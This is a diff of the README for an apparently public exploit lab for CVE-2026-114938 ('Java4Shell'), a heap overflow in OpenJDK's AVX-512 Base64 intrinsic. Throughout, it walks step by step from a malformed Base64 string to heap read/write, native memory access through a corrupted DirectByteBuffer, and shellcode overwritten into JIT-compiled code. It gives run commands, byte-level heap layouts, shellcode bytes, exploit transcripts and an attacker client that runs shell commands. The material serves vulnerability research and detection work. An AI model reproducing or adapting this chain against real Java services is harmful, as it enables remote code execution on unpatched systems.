@@ -1,32 +1,11 @@
-# Java4Shell / Java2Shell — CVE-2026-114938 Lab
+# Java4Shell — CVE-2026-114938
 
-A reproducible, network-isolated Docker lab for **CVE-2026-114938**, the OpenJDK
-HotSpot x86-64 AVX-512 Base64 decoder heap overflow publicly called
-**Java4Shell** (also **Java2Shell**).
+A complete, reproducible exploit lab for **CVE-2026-114938** ("Java4Shell" /
+"Java2Shell"), the heap overflow in OpenJDK HotSpot's AVX-512 Base64 decoder.
 
-> **Educational / authorized testing only.**
-> This lab deliberately corrupts its own JVM heap and, in the optional `rce`
-> stage, executes attacker-supplied commands inside a disposable container.
-> Run it only in the provided container, and never against a system you do not
-> own. The RCE target is a purpose-built local service, not a real product.
-
-| | |
-|---|---|
-| **CVE** | CVE-2026-114938 |
-| **Public names** | Java4Shell / Java2Shell |
-| **Component** | OpenJDK HotSpot x86-64 AVX-512 VBMI Base64 intrinsic |
-| **Impact** | Heap out-of-bounds write; heap read/write and disclosure primitives; RCE in product-specific chains |
-| **Hardware gate** | x86-64 with `avx512f avx512bw avx512vbmi bmi2` (Ice Lake+ / Zen 4+) |
-| **Affected branches** | OpenJDK 17 (from 17.0.6), 21, 25, 27 |
-| **Lab scope** | Bounded trigger, length corruption, OOB read, heap leak, chosen-value OOB write, writer/reader/forge/repair chain (stops before Code Cache), application-sink command execution |
-
-## In one sentence
-
-Java's fast Base64 decoder is told to write 0 bytes, an underflow turns that
-into `-1`, the CPU treats `-1` as "write all 64 bytes", and 62 bytes spill past
-the output buffer before Java throws an error.
-
-## The complete chain
+The lab goes all the way from a malformed Base64 string to **arbitrary native
+code execution**, using only the vulnerability itself — no `sun.misc.Unsafe`,
+no JNI, no native library loading, and no second memory-safety bug.
 
 ```text
 malformed Base64 tail  (64 * "A" + "=")
@@ -36,7 +15,7 @@ corrupted array length  ->  "writer"
    |
    +--> chosen-value linear write
    |       |
-   |       +--> read neighbours        ->  heap disclosure ("reader"/JavaBleed)
+   |       +--> heap disclosure ("reader" / JavaBleed)
    |       |
    |       +--> corrupt a DirectByteBuffer.address
    |                |
@@ -47,616 +26,320 @@ corrupted array length  ->  "writer"
    |            J4S-RCE-PWN  (exit 42)
 ```
 
-Every arrow is implemented and verified in this repository. No `sun.misc.Unsafe`,
-no JNI, no native library loading, and no second memory-safety bug.
+---
 
-## Status
+> ## ⚠️ Authorized testing only
+>
+> This repository contains working exploit code. It deliberately corrupts a JVM
+> heap and executes shellcode. It is intended for **education, vulnerability
+> research, and detection engineering** on systems you own.
+>
+> Run it only inside the disposable container this repo builds. Never point it
+> at a system you do not own or have explicit written permission to test.
+> Unauthorized use may violate computer-misuse laws.
 
-Tested end-to-end on **2026-11-23** with:
+---
 
-- **Eclipse Temurin 21.0.13+9** (pre-fix; fixed in 21.0.13.1)
-- **Intel SDE 10.13.1** (`sde64 -chip_check_disable -icx -- java ...`)
-- An Intel **i5-7200U** host (Kaby Lake) with `avx avx2 bmi1 bmi2` but **no**
-  AVX-512, so SDE spoofs an Ice Lake CPU
-- Docker with `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined
-  --network none`
+## Contents
 
-All base stages behaved as expected: `trigger`, `corrupt`, `leak`, and `write`
-reproduced; `control` did not reproduce (which is the expected result).
+| | |
+|---|---|
+| **CVE** | CVE-2026-114938 |
+| **Public names** | Java4Shell / Java2Shell |
+| **Component** | OpenJDK HotSpot x86-64 AVX-512 VBMI Base64 intrinsic |
+| **Root cause** | `BZHI` mask underflow → 64-byte store 62 bytes past the output buffer (CWE-122) |
+| **Severity** | CVSS 3.1 **8.1** High (Oracle/NVD) · CVSS 4.0 **9.2** Critical (reporter) |
+| **Hardware gate** | x86-64 with `avx512f avx512bw avx512vbmi bmi2` (Ice Lake+ / Zen 4+) |
+| **Affected** | OpenJDK 17.0.6 – 17.0.21.0.3, 21.0.13.0.3, 25.0.5.0.3, 27.0.1.0.3 |
+| **Fixed** | 17.0.21.1 · 21.0.13.1 · 25.0.5.1 · 27.0.1.1 |
+| **Lab platform** | x86-64 Linux + Docker (uses Intel SDE when the host has no AVX-512) |
 
-The `chain` stage reached every heap primitive and completed three forced GCs
-after header repair. The `native` stage then obtained a **64-bit native
-read/write** by corrupting a `DirectByteBuffer.address` — no Unsafe, no JNI, no
-second bug. The `codecache` stage used that primitive to locate a JIT-compiled
-method in the Code Cache and overwrite it with shellcode: **full code
-execution**, proven by the marker the shellcode prints and exit status 42.
-The `rce` stage reaches command execution through a purpose-built application
-sink, which is a separate path. All negative controls (`control`,
-`chain-control`, `codecache-control`, `rce-control`) failed to reproduce.
+---
 
-On a real AVX-512 host, use `LAB_MODE=native` to skip SDE.
+## What this lab demonstrates
 
-## Why this lab exists
+Nine stages, each independently runnable, plus four negative controls:
 
-The vulnerability is small, but exploiting it is not. The primary overflow
-writes a **fixed pattern**; the attacker controls only where it lands. This lab
-shows how that fixed write becomes a useful primitive:
+| Stage | What it proves |
+|---|---|
+| `trigger` | The intrinsic really performs a 64-byte masked store; 62 bytes land past the decoded output. |
+| `corrupt` | That store overwrites a neighbouring array's **length**, and Java's bounds checks then trust it. |
+| `leak` | The corrupted length becomes a heap **disclosure** primitive ("JavaBleed"). |
+| `write` | The corrupted length becomes a **chosen-value out-of-bounds write**. |
+| `chain` | Full **writer → reader → forged array header → repair**, surviving three forced GCs. |
+| `native` | Corrupting a `DirectByteBuffer.address` yields **64-bit native read/write**. |
+| `codecache` | Scanning and overwriting JIT-compiled code yields **shellcode execution**. |
+| `rce` | A separate, application-specific path: attacker bytes reach an app sink and execute. |
+| `control` ×4 | Every stage above has a `-XX:-UseBASE64Intrinsics` twin that must **not** reproduce. |
 
-1. A malformed Base64 tail causes a 64-byte masked store to overrun the
-   decoder's output buffer.
-2. The spill overwrites the length field of an adjacent Java array.
-3. Java's normal bounds checks then trust the corrupted length.
-4. Ordinary Java array reads and writes become out-of-bounds reads and writes.
-5. The same corruption gives a heap-disclosure primitive ("JavaBleed").
-6. The `chain` stage builds the real second half: writer, reader, forged array
-   header, and header repair that survives a forced GC.
-7. The `native` stage corrupts a `DirectByteBuffer` address to obtain a 64-bit
-   native read/write — the primitive needed to reach the Code Cache.
-8. The `rce` stage moves attacker bytes into an application sink and executes
-   them. It is a different, application-specific path.
+### The primitives, in order
 
-## Affected versions
+1. **Fixed write.** A malformed Base64 tail makes `output_len` go negative. `BZHI`
+   reads only the low 8 bits, so the mask becomes all-ones and a 64-byte store
+   runs past the output array. Java throws `IllegalArgumentException` — after the
+   write has already happened.
+2. **Writer.** The spill lands on a neighbouring array's 4-byte length field,
+   turning it into `0x699AA669` (1,771,742,825). Ordinary Java stores now write
+   attacker-chosen bytes far past that array.
+3. **Reader.** The writer installs a chosen length into a second array, giving
+   out-of-bounds reads through plain Java indexing.
+4. **Forge.** A fake array header plus a forged compressed oop gives an aliased
+   view with read/write over other heap objects.
+5. **Repair.** Lengths and oops are restored, the corrupted writer is dropped,
+   and three forced GCs confirm the heap is consistent — the step the
+   researchers describe as needed "to keep the JVM running".
+6. **Native.** A corrupted `java.nio.DirectByteBuffer.address` turns the buffer's
+   own public API into a 64-bit native read/write, escaping the Java heap.
+7. **Code execution.** A JIT-compiled method is located in the Code Cache by its
+   unique instruction bytes, overwritten with shellcode, and invoked.
 
-| Branch | Affected | Fixed |
-|---|---|---|
-| 17 | 17.0.6 through 17.0.21.0.3 | **17.0.21.1** |
-| 21 | up to 21.0.13.0.3 | **21.0.13.1** |
-| 25 | up to 25.0.5.0.3 | **25.0.5.1** |
-| 27 | up to 27.0.1.0.3 | **27.0.1.1** |
-| 8 (Oracle Enterprise Performance Pack only) | 8u511b33-perf | **8u513-perf** |
-
-Standard Java 8 and 11 builds, and OpenJ9, are not affected. The bug was
-introduced in OpenJDK 17.0.6. Branches 18–20, 22–24, and 26 have no fix; move
-to a supported line.
-
-## Hardware gate
-
-The vulnerable stub only runs when **all four** CPU flags are present:
-
-```text
-avx512f avx512bw avx512vbmi bmi2
-```
-
-In practice: Intel Ice Lake, Sapphire Rapids, Emerald Rapids, or Granite
-Rapids; or AMD Zen 4+. ARM64, older x86-64, and any x86-64 JVM started with
-`-XX:UseAVX=2` never execute the vulnerable path.
-
-The intrinsic is only reached after the C2 JIT compiles the decode path, so a
-busy service needs a warm decoder.
-
-## Requirements
-
-- **x86-64 Linux Docker host.** Intel SDE/Pin does not work under ARM-to-x86
-  emulation, so Apple Silicon and other ARM hosts are not supported.
-- Docker with permission to add `SYS_PTRACE` and use `seccomp=unconfined` for
-  the disposable container (Pin needs `ptrace`).
-- ~1.5 GB free disk.
-- Network access **at build time** for the JDK base image and SDE. Runtime is
-  fully offline (`--network none`).
+---
 
 ## Quick start
+
+Requirements: x86-64 Linux, Docker, ~1.5 GB disk, and network access **at build
+time** (runtime is fully offline).
 
 ```bash
 git clone https://github.com/akshutgoyal/Java4Shell.git
 cd Java4Shell
 chmod +x run.sh
 
-./run.sh --build all     # build the image and run every stage
+./run.sh --build codecache     # full chain -> shellcode execution
 ```
 
-Run individual stages:
-
-```bash
-./run.sh trigger       # bounded, non-destructive OOB-write measurement
-./run.sh control       # -XX:-UseBASE64Intrinsics (expected: NOT REPRODUCED)
-./run.sh corrupt       # heap corruption + OOB read
-./run.sh leak          # JavaBleed-style heap disclosure
-./run.sh write         # chosen-value OOB write into a neighbour
-./run.sh chain         # writer -> reader -> forged header -> repair + GC
-./run.sh chain-control # same chain with the intrinsic disabled
-./run.sh native        # 64-bit native read/write via corrupted buffer
-./run.sh codecache     # full RCE: shellcode runs, process exits 42
-./run.sh rce           # command execution via a local application sink
-./run.sh rce-control   # same RCE attempt with the intrinsic disabled
-```
-
-The first build downloads and SHA256-verifies Intel SDE from Intel's mirror.
-The vulnerable Temurin image is pinned by digest.
-
-### Plain Docker
-
-```bash
-docker build -t java4shell-lab:local .
-
-docker run --rm \
-  --cap-add=SYS_PTRACE \
-  --security-opt seccomp=unconfined \
-  --network none \
-  --tmpfs /tmp:rw,nosuid,nodev,size=512m \
-  java4shell-lab:local trigger
-```
-
-### Docker Compose
-
-```bash
-docker compose build
-docker compose run --rm java4shell trigger
-```
-
-### Environment
-
-| Variable | Values | Default |
-|---|---|---|
-| `LAB_MODE` | `auto`, `native`, `sde` | `auto` |
-| `LAB_WARMUP` | number of valid decodes | `1000` |
-| `LAB_RCE_CMD` | command the RCE client asks the target to run | `id; uname -a` |
-
-`auto` uses the native JVM when `/proc/cpuinfo` has all four AVX-512 flags, and
-SDE otherwise. Force it with `LAB_MODE=native` or `LAB_MODE=sde`.
-
-Note: the `native` *stage* (`./run.sh native`, the 64-bit native read/write
-demo) is unrelated to `LAB_MODE=native` (run the JVM without SDE).
-
-On real AVX-512 hardware:
-
-```bash
-LAB_MODE=native ./run.sh all
-```
-
-## Expected output
-
-### `trigger` — real 64-byte masked store
+Expected tail of the output:
 
 ```text
-rejected     = true
-changed      = 62 (expected 62)
-first        = 50 (expected 50)
-last         = 111 (expected 111)
-REPRODUCED
-```
-
-The decoder rejects the input, but 62 bytes starting at offset 50 have already
-been overwritten inside the large canary array. The two bytes at offsets 48–49
-are the in-bounds part of the same 64-byte store.
-
-### `control` — `-XX:-UseBASE64Intrinsics`
-
-```text
-changed      = 0 (expected 62)
-first        = -1 (expected 50)
-last         = -1 (expected 111)
-NOT REPRODUCED
-```
-
-The safe Java decoder never performs the wide store. This stage **exits 1 by
-design**.
-
-### `corrupt` — length corruption + OOB read
-
-```text
-length before   = 64 (java 64)
-length after    = 1771742825 (java 1771742825)
-CORRUPTED: victim length changed from 64 to 1771742825
-OOB READ OK: victim[4096] = 0x73
-OOB READ REPRODUCED
-```
-
-The victim's Java-visible length is now `0x699AA669` (1,771,742,825), and a
-plain Java read at index 4096 succeeds.
-
-### `leak` — JavaBleed-style disclosure
-
-```text
-length after  = 1771742825
-leaked marker at victim[80] = J4S-SECRET-...
-JAVA BLEED REPRODUCED
-```
-
-The corrupted length lets ordinary Java read across the object boundary into
-a neighbouring `secret` array. The marker is a verification aid; in a real
-target, the attacker would scan the leaked heap for keys, tokens, or PII.
-
-### `write` — chosen-value OOB write
-
-```text
-length after  = 1771742825
-target before = 41 41 41 41 41 41 41 41 ...
-target after  = 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51
-OOB WRITE REPRODUCED
-```
-
-Ordinary Java stores at `victim[80+i]` land in the neighbouring `target` array
-with attacker-chosen bytes.
-
-### `chain` — writer, reader, forge, repair
-
-This is the real second half of the exploit, with no `sun.misc.Unsafe`, no JNI
-and no native code. Five arrays are allocated back-to-back in one TLAB:
-
-```text
-[ dst: 66 ][ writer: 64 ][ reader: 64 ][ table[1] ][ anchor: 256 ][ post: 64 ]
-```
-
-```text
-=== PHASE 1: writer (fixed spill -> corrupted length) ===
-writer.length after  = 1771742825 (0x699aa669)
-chosen write at writer[200] -> anchor[16] = J4SWRITE
-WRITER OK: chosen-value linear write established
-
-=== PHASE 2: reader (chosen length -> disclosure) ===
-reader.length        = 2147483647 (0x7fffffff)
-anchor data at reader[104]
-anchor oop           = 0xe2e488e4
-anchor klass (narrow)= 0x2318
-READER OK: out-of-bounds disclosure established
-
-=== PHASE 3: forged array header (object aliasing) ===
-fake oop             = 0xe2e488f0 (anchor + 12 compressed units)
-fake.length          = 2147483632
-aliased write        fake[8] -> anchor[104] = 0x5a
-post data at fake[176]
-cross-object write   fake[176] -> post[0] = 'X'
-FORGE OK: chosen read/write over arbitrary heap objects
-
-=== PHASE 4b: force a real GC ===
-GC round 1..3 completed
-anchor marker intact = true
-post content intact  = true
-reader[64] rejected  = true
-REPAIR OK: JVM survived GC with the corrupted writer abandoned
-
-CHAIN COMPLETE (heap writer/reader/forge/repair)
-NATIVE ACCESS IS REACHABLE: see the 'native' stage
-```
-
-What each phase establishes:
-
-| Phase | Primitive |
-|---|---|
-| writer | The fixed 62-byte spill corrupts a neighbour's length; that array then performs a **chosen-value linear write** over later objects. |
-| reader | The writer installs a chosen length into a second array, giving **out-of-bounds disclosure** (JavaBleed) through ordinary Java reads. |
-| forge | A fake array header written into `anchor` plus a forged compressed oop in `table[0]` gives an **aliased view** that reads and writes other heap objects. |
-| repair | Lengths and oops are restored, the corrupted writer is dropped, its thread exits, and **three forced GCs** prove the reachable heap is consistent. |
-
-Repair is the step the researchers describe as necessary "to keep the JVM
-running": without it the next young collection dies walking a half-smashed
-object. The phase table above shows why `chain` is only the heap half — the
-`native` stage below is what leaves the Java heap.
-
-### `chain-control` — negative control
-
-Same program with `-XX:-UseBASE64Intrinsics`:
-
-```text
-writer.length after  = 64 (0x40)
-NOT VULNERABLE: length unchanged
-```
-
-Exit 1 from the program, which the runner normalizes to 0 after confirming the
-expected "no corruption" result. No corruption means no writer, reader or forge.
-
-### `native` — 64-bit native read/write (no Unsafe, no JNI)
-
-`Chain` is heap-only by construction: every reference is a 32-bit compressed oop
-and every access is `base + non-negative int`, so it cannot leave the Java heap.
-That is a limit of *that program*, not of the vulnerability.
-
-`NativeProbe` takes the next step. It corrupts the `address` field of a
-`java.nio.DirectByteBuffer` through the same corrupted writer, then uses the
-buffer's own public API — which now dereferences an attacker-chosen 64-bit
-address:
-
-```text
-victim data    = 0x7175cfb08  at writer[848]
-direct object  = 0x7175cf978
-
---- probing candidate address slots ---
-  +16  0x00007f7700179de0  read=0x1122334455667788   <== address field
-
-direct.getLong(0) = 0x1122334455667788
-victim[8..15]     = 55 66 77 88 99 aa bb cc
-
-native read  ok = true
-native write ok = true
-
-NATIVE PRIMITIVE REACHED FROM HEAP CORRUPTION ALONE
-DirectByteBuffer.address is a full 64-bit pointer.
-The Code Cache lives in that same address space.
-```
-
-The offsets are computed, not hardcoded: the narrow oops in an `Object[]` give
-the array and buffer addresses, the victim's fill run locates it inside the
-writer's view, and the address field is then confirmed by redirecting it at a
-known array and reading it back through `ByteBuffer.getLong`.
-
-This matters because the JVM's Code Cache is an `rwxp` mapping in that same
-address space. In this image, `/proc/self/maps` shows 45 executable mappings,
-20 of them writable+executable, including a 64 MB anonymous `rwxp` region.
-A 64-bit native read/write is therefore one rewritten function pointer away from
-code execution — no `sun.misc.Unsafe`, no JNI, and no second memory-safety bug.
-
-The next stage implements the final step: `CodeCacheRce` finds the compiled
-method and executes shellcode from it. The full status is:
-
-| Step | Status |
-|---|---|
-| Fixed OOB write → corrupted length | ✅ verified |
-| Heap disclosure ("JavaBleed") | ✅ verified |
-| Chosen-value linear write | ✅ verified |
-| Header repair + GC survival | ✅ verified |
-| **64-bit native read/write** | ✅ verified (`native` stage) |
-| **Code Cache overwrite → shellcode** | ✅ verified (`codecache` stage) |
-
-### `codecache` — shellcode execution (weaponized RCE)
-
-`CodeCacheRce` completes the chain. It uses the native read/write from the
-`native` stage and adds three steps:
-
-```text
-[2] direct.address @ writer[312], scan.address @ writer[696]
 [2] NATIVE READ/WRITE READY
-[3] maps lines=363 exec=45 usable=44
-[3] scanning 44 readable executable mappings
-[3] scanned 1093748 KiB, 0 unreadable chunk(s)
-[3] 2 signature site(s): 0x7f1b08b3d59a, 0x7f1b29889b31
-[3] shellcode 48 bytes: b8 01 00 00 00 bf 01 00 00 00 48 8d 35 13 ...
+[3] 2 signature site(s): 0x7f5fb4b3d59a, 0x7f5fd4089959
 [4] shellcode installed at 2 site(s)
 [5] invoking victimMethod() ...
 [5] expect marker below and exit status 42
 J4S-RCE-PWN
+[codecache] OK: shellcode executed (exit 42)
 ```
 
-and the process exits **42**.
+Success means the shellcode **we wrote** printed `J4S-RCE-PWN` and then called
+`exit_group(42)`. A crash would not produce either.
 
-How the last steps work:
-
-1. **Find the code.** A leaf method `victimMethod()` returns a unique 64-bit
-   constant. C2 compiles it to `movabs rax, <constant>`; the program scans
-   readable executable mappings for that exact instruction (`48 b8` + the
-   constant) to locate the method's entry point. Scanning is bounded to
-   `/proc/self/maps` regions and skips the `vsyscall` page.
-2. **Overwrite it.** The corrupted `DirectByteBuffer` address gives a 64-bit
-   write; the signature site is replaced with 48 bytes of shellcode.
-3. **Run it.** Reflecting `victimMethod()` enters the overwritten code.
-
-The shellcode is x86-64 Linux: `write(1, "J4S-RCE-PWN\n", 12)` followed by
-`exit_group(42)`. It never returns, so the hijacked method needs no valid stack
-frame. Both the marker (proving *our* code ran) and exit status 42 (chosen by
-us) are proof of control — not a crash.
+### Run every stage
 
 ```bash
-./run.sh codecache           # expected: marker + exit 42 (~3 min)
-./run.sh codecache-control   # intrinsic disabled: NOT VULNERABLE, exit 0
+./run.sh all          # ~14 minutes under SDE
 ```
 
-`codecache-control` disables the intrinsic, so `writer.length` stays 64 and the
-program stops at step 1 without touching the Code Cache.
+### Run one stage
 
-**Caveats.** This is real code execution inside the disposable container, not a
-product exploit. The signature search assumes x86-64 and a specific JIT
-encoding; a different build may need a different signature. It also requires the
-process to have writable+executable Code Cache, which is the case here (20 of 45
-executable mappings are `rwxp`).
+```bash
+./run.sh trigger    ./run.sh corrupt    ./run.sh leak      ./run.sh write
+./run.sh chain      ./run.sh native     ./run.sh codecache ./run.sh rce
+```
 
-### `rce` — command execution via an application sink
+### Negative controls
 
-The RCE stage adds an HTTP service (`poc/RceLab.java`) and an attacker client
-(`poc/RceClient.java`). It shows the **realistic last mile** that Tenable
-describes — a reachable Base64 decode path plus an application sink:
+Each must fail to reproduce. Controls exit 0 when they correctly do nothing.
+
+```bash
+./run.sh control           # trigger with -XX:-UseBASE64Intrinsics
+./run.sh chain-control     # heap chain, intrinsic disabled
+./run.sh codecache-control # RCE chain, intrinsic disabled
+./run.sh rce-control       # app-sink path, intrinsic disabled
+```
+
+### On real AVX-512 hardware
+
+The lab uses Intel SDE to emulate AVX-512 on hosts that lack it. If your CPU has
+all four flags, skip emulation entirely (much faster):
+
+```bash
+LAB_MODE=native ./run.sh codecache
+```
+
+> `LAB_MODE=native` (no emulator) is unrelated to the `native` **stage**
+> (`./run.sh native`, the DirectByteBuffer primitive).
+
+---
+
+## How it works without AVX-512 hardware
+
+The vulnerable code is real AVX-512 VBMI machine code, generated by HotSpot only
+when the CPU reports `avx512vbmi`. QEMU's TCG cannot emulate AVX-512, so this lab
+uses **Intel SDE 10.13.1**:
 
 ```text
-[*] blob length 100 -> 1771742825 (unsigned 1771742825)
-[*] scanning heap through blob[off] ...
-[*] payload at blob[120] = 4a34533a  (out of bounds)
-    RCE CONFIRMED
-    cmd=id; uname -a
-    exit=0
-    uid=0(root) gid=0(root) groups=0(root)
-
-[+] RCE CHAIN COMPLETE: heap corruption -> OOB read -> command execution
+sde64 -chip_check_disable -icx -- java ...
 ```
 
-**This stage is not Code Cache RCE.** The vulnerability supplies the corruption
-and the read; the *application* supplies the execution. `RceLab`'s maintenance
-hook executes a config string it reads from the session blob, so the stage proves
-that attacker bytes can be moved into a real sink — not that the JVM can be made
-to run arbitrary native code with no application gadget. Real products need an
-equivalent sink; that is why Calif and VulnCheck describe RCE as
-application-specific.
+`-icx` spoofs an Ice Lake CPUID and `-chip_check_disable` permits that on any
+host. HotSpot then reports `UseAVX=3` / `UseBASE64Intrinsics=true` and generates
+the genuine vulnerable stub. SDE executes the **actual JVM machine code** — this
+is CPU emulation, not a reimplementation of the bug.
 
-`rce-control` runs the identical chain with `-XX:-UseBASE64Intrinsics`; the blob
-length stays `100` and the client reports `NO CORRUPTION (control path)`.
+The JVM is **Temurin 21.0.13+9**, a pre-fix build, pinned by image digest so the
+tag cannot silently change. SDE is downloaded from Intel's official mirror and
+verified against Intel's published SHA-256 at build time.
 
-**Notes**
+Because emulation is slow, the runner uses `-Xcomp -XX:-TieredCompilation` and a
+short warm-up so C2 compiles the decode path quickly.
 
-- `./run.sh control` exits 1 by design (the trigger correctly fails to
-  reproduce). `./run.sh chain-control` and `./run.sh rce-control` normalize the
-  expected failure to exit 0. `./run.sh all` prints each stage's exit code and
-  finishes with a summary, so the overall command exits 0.
-- The exact leaked byte at `victim[4096]` and the random marker suffix can vary
-  between runs; the length and offsets are deterministic with this layout.
-- The heap layout is deterministic with this pinned image, but may miss on a
-  different JVM or GC configuration. Re-run the stage if needed.
+---
 
-## How the bug works
+## Verified results
 
-For the tail of a Base64 input, the x86-64 intrinsic computes:
+Recorded on Temurin 21.0.13+9 under Intel SDE, 2026-11-24:
+
+| Stage | Key output | Exit |
+|---|---|---|
+| `trigger` | `changed=62 first=50 last=111` → `REPRODUCED` | 0 |
+| `control` | `changed=0` → `NOT REPRODUCED` | 1 (by design) |
+| `corrupt` | length `64 → 1771742825`, `OOB READ REPRODUCED` | 0 |
+| `leak` | marker at `victim[80]` → `JAVA BLEED REPRODUCED` | 0 |
+| `write` | target bytes `42 43 44 …` → `OOB WRITE REPRODUCED` | 0 |
+| `chain` | writer/reader/forge → `REPAIR OK` after 3 GCs | 0 |
+| `native` | `native read ok` + `native write ok` → `NATIVE PRIMITIVE REACHED` | 0 |
+| `codecache` | `J4S-RCE-PWN` → `shellcode executed (exit 42)` | 0 (42 inside) |
+| `rce` | `RCE CONFIRMED`, command output returned | 0 |
+| all controls | no corruption, no marker | 0 |
+
+<details>
+<summary><b>Full <code>codecache</code> transcript</b></summary>
 
 ```text
-input_mask  = BZHI(-1, input_len)
-output_len  = (input_len / 4) * 3
-
-if input[input_len - 1] == '=':
-    output_len -= 1
-    input_mask >>= 1
-    if input[input_len - 2] == '=':
-        output_len -= 1
-        input_mask >>= 1
-
-output_mask = BZHI(-1, output_len)
+runtime = 21.0.13+9-LTS
+[warm] decoder compiled
+[warm] victimMethod() = 0x4a34535243454f31 (compiled)
+[1] writer.length = 1771742825 (0x699aa669)
+[2] victim data = 0x7172243b0 at writer[832], writer data = 0x717224070
+    probing buffer obj=0x717224198 -> writer[296]
+    +16  writer[ 312] 0x00007f5fc0187260 <== address field
+    probing buffer obj=0x717224318 -> writer[680]
+    +16  writer[ 696] 0x00007f5fc018db20 <== address field
+[2] direct.address @ writer[312], scan.address @ writer[696]
+[2] NATIVE READ/WRITE READY
+[3] scanning 44 readable executable mappings
+[3] scanned 1093748 KiB, 0 unreadable chunk(s)
+[3] 2 signature site(s): 0x7f5fb4b3d59a, 0x7f5fd4089959
+[3] shellcode 48 bytes: b8 01 00 00 00 bf 01 00 00 00 48 8d 35 13 ...
+[4] shellcode installed at 2 site(s)
+[5] invoking victimMethod() ...
+J4S-RCE-PWN
+[codecache] OK: shellcode executed (exit 42)
 ```
 
-For `64 * "A" + "="` (65 bytes):
+</details>
 
-- The tail output length is `0 - 1 = -1`.
-- `BZHI` looks only at the low 8 bits of the index: `-1` looks like `255`.
-- Since `255 >= 64`, no bits are cleared, so the 64-bit mask is all ones.
-- The masked store (`VMOVDQU8` / `evmovdqub`) writes all 64 bytes at offset 48
-  of the 50-byte output array: **2 bytes in bounds, 62 bytes past the end**.
-- The JVM then throws `IllegalArgumentException`, but the write has already
-  happened.
+---
 
-The overflow bytes are stub-derived (`69 a6 9a ...`, and `0x9a` for the last
-16 bytes), so the attacker controls **where** the write lands, not its
-contents.
-
-On JDK 17, the trigger is `128 * "A" + "="` (129 bytes); on JDK 21/25/27 it is
-`64 * "A" + "="` (65 bytes).
-
-## How the PoCs use the corruption
-
-A Java `byte[]` has a 16-byte header: mark word, class pointer, and a 4-byte
-length at object offset 12. Java's bounds checks read that length.
-
-The heap PoCs allocate:
+## Repository layout
 
 ```text
-[ dst: 66 bytes ][ victim: 64 bytes ][ target / secret: ... ]
+Dockerfile              pinned vulnerable Temurin + SHA-256-verified Intel SDE
+run.sh                  plain-Docker launcher (no Compose required)
+compose.yaml            optional Compose configuration
+scripts/run-lab.sh      stage runner: trigger|control|...|codecache|all
+
+poc/Base64Trigger.java  bounded trigger: measures the 62-byte overflow
+poc/HeapCorruption.java neighbour length corruption + OOB read
+poc/HeapLeak.java       JavaBleed-style heap disclosure
+poc/HeapWrite.java      chosen-value OOB write
+poc/Chain.java          writer -> reader -> forged header -> repair + GC
+poc/NativeProbe.java    corrupted DirectByteBuffer.address -> native R/W
+poc/CodeCacheRce.java   Code Cache overwrite -> shellcode execution
+poc/RceLab.java         vulnerable HTTP service (application-sink path)
+poc/RceClient.java      attacker client for the HTTP path
 ```
 
-- `dst` is 82 bytes of object (16-byte header + 66 data), rounded to 88 bytes.
-- The 64-byte store starts at `dst` data offset 48.
-- The `victim`'s length field lands at store offset 36.
-- The bytes there are `69 a6 9a 69`, which Java reads as `0x699AA669`
-  (1,771,742,825), a large positive length.
+---
 
-From that point on, `victim[4096]`, `victim[80]`, and `victim[80+i] = ...` are
-ordinary Java array accesses that pass the JVM's bounds checks. `sun.misc.Unsafe`
-is used only to read the length header before and after the decode in the
-smashing PoCs; the actual out-of-bounds accesses are plain Java bytecode.
-`Chain.java` and the RCE stage use no `Unsafe` at all — they locate headers
-through the corrupted array itself.
+## Scope and honesty
 
-### How `Chain.java` builds on this
+What this lab **does** prove:
 
-`Chain.java` arranges the objects so each primitive feeds the next:
+- The bug is a real, silent, out-of-bounds write that survives the
+  `IllegalArgumentException`.
+- That write alone escalates to heap read/write, native memory access, and
+  control-flow hijack — with no second vulnerability.
+- Every step has a negative control that fails to reproduce when the intrinsic
+  is disabled.
+
+What it **does not** provide:
+
+- **Remote exploitation.** There is no network transport, G1 heap grooming,
+  region spraying, TLB/request parking, or retry logic. The lab uses
+  deterministic TLAB adjacency from a pinned image. Real targets need the
+  application-specific grooming Calif describes.
+- **A universal payload.** The Code Cache search relies on x86-64 encoding and a
+  unique `movabs` constant. Another JVM build, GC, or inlining decision may need
+  a different signature. That is an engineering difference, not a missing
+  primitive.
+- **A product exploit.** The `rce` stage executes commands only because
+  `RceLab` contains a maintenance sink that runs a config string. It
+  demonstrates the *last mile* shape of a real chain, not a gadget for a
+  specific product.
+- **Writable Code Cache everywhere.** The `codecache` stage relies on the JVM
+  having writable+executable code pages (20 of 45 executable mappings here). A
+  hardened runtime without RWX pages needs a different target.
+
+---
+
+## Affected versions and hardware
+
+| Branch | Affected | Fixed |
+|---|---|---|
+| 17 | 17.0.6 – 17.0.21.0.3 | **17.0.21.1** |
+| 21 | up to 21.0.13.0.3 | **21.0.13.1** |
+| 25 | up to 25.0.5.0.3 | **25.0.5.1** |
+| 27 | up to 27.0.1.0.3 | **27.0.1.1** |
+| 8 (Oracle Enterprise Performance Pack) | 8u511b33-perf | **8u513-perf** |
+
+Standard Java 8/11 builds and OpenJ9 are not affected. The bug was introduced in
+OpenJDK 17.0.6. The intrinsic only runs when **all four** flags are present:
 
 ```text
-[ dst: 66 ][ writer: 64 ][ reader: 64 ][ table[1] ][ anchor: 256 ][ post: 64 ]
+avx512f  avx512bw  avx512vbmi  bmi2
 ```
 
-1. **writer** — the spill corrupts `writer`'s length. Stores at `writer[i]` for
-   `i > 64` are chosen-value writes into later objects.
-2. **reader** — the writer installs `0x7fffffff` into `reader`'s length field
-   (which sits 80 bytes past the writer's data, at writer index 76). Reads at
-   `reader[i]` are now a heap-disclosure primitive.
-3. **forge** — the reader recovers `anchor`'s compressed oop and its `klass`
-   from `table[0]` and `anchor`'s header. A fake array header planted at
-   `anchor[80]` plus a forged oop in `table[0]` makes `table[0]` resolve to a
-   `byte[]` whose data starts at `anchor[96]`. That gives chosen read/write over
-   other heap objects (`post[0]` is overwritten through it).
-4. **repair** — the writer restores `reader.length` and `table[0]`, then its
-   reference is dropped. The chain runs on its own thread so that thread's stack
-   disappears; three forced GCs then prove the remaining heap is consistent.
+i.e. Intel Ice Lake / Sapphire Rapids / Emerald Rapids / Granite Rapids, or AMD
+Zen 4+. ARM64, older x86-64, and any JVM started with `-XX:UseAVX=2` never take
+the vulnerable path. The intrinsic also requires the decode path to be
+JIT-compiled by C2 first.
 
-The forged view can only move **forward** inside the Java heap (base + positive
-int index, 32-bit compressed oops), which is precisely why it cannot reach the
-Code Cache.
+---
 
